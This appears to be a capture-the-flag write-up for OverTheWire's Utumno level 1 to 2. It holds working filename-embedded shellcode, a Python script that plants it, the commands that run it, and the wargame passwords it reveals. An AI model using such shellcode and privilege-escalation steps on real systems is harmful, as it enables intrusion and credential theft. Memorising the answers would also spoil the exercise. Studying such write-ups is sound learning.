# Utumno Level 01 to 02

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Utumno |
| Level | 1 -> 2 |
| Status | Complete |

## Objective

Exploit `utumno1` so it executes attacker-controlled bytes as `utumno2` and recover the next password.

## Given Access

User: `utumno1`

Password:

```text
ytvWa6DzmL
```

## Recon

Disassembly showed that `utumno1`:

- mmaps an RWX page,
- scans a user-supplied directory with `readdir()`,
- checks whether each entry name starts with `sh_`, and
- passes the bytes after that prefix into a `run()` helper.

`run()` copies those bytes into the RWX mapping and then overwrites its own saved return address with the mapping base before returning. In other words, any directory entry named `sh_<raw bytes>` becomes executable shellcode.

A subtle gotcha: the `sh_` check applies to the actual filename start, not to an 11-byte offset inside the name. The 11-byte offset visible in the disassembly is the `struct dirent` offset to `d_name`.

## Method

1. Create a working directory under `/tmp`.
2. Inside it, create:
   - `x` -> symlink to `/bin/cat`
   - `pw` -> symlink to `/etc/utumno_pass/utumno2`
3. Assemble filename-safe shellcode with no `0x00` and no `/` bytes.
4. Make the filename `sh_<shellcode>` using raw bytes via `os.open()` on a `bytes` path so UTF-8 encoding does not corrupt the payload.
5. Run `/utumno/utumno1` from that working directory, pointing it at the directory itself.
6. The shellcode performs `setreuid(16002,16002)` and then `execve("x", ["x", "pw"], NULL)`, which executes the local `x` symlink as `utumno2` and prints the password via the local `pw` symlink.

## Verified Filename-Safe Shellcode

Hex bytes:

```text
31c0b04631db66bb823e31c966b9823ecd8031c0506668707789e7506a7889e350575389e131d2b00bcd80
```

This payload contains neither null bytes nor `/`, which is critical because it must live inside a filename.

## Commands

```bash
ssh -p 2227 utumno1@utumno.labs.overthewire.org
rm -rf /tmp/u1x && mkdir /tmp/u1x
cd /tmp/u1x
ln -sf /bin/cat x
ln -sf /etc/utumno_pass/utumno2 pw
python3 - <<'PY'
import os, binascii
sc = binascii.unhexlify('31c0b04631db66bb823e31c966b9823ecd8031c0506668707789e7506a7889e350575389e131d2b00bcd80')
name = b'sh_' + sc
fd = os.open(name, os.O_WRONLY | os.O_CREAT, 0o644)
os.close(fd)
print([n.hex() for n in os.listdir(b'.')])
PY
/utumno/utumno1 /tmp/u1x
```

## Result

Live output returned the next password directly:

```text
RdUzprHKSm
```

That password was then verified by logging in as `utumno2`.

## Lesson

When a challenge promotes raw bytes from a filename into executable memory, encoding details matter as much as the shellcode itself. Creating the filename through Python's bytes-oriented filesystem APIs avoided accidental UTF-8 expansion of high-bit shellcode bytes.

## References

- https://overthewire.org/wargames/utumno/
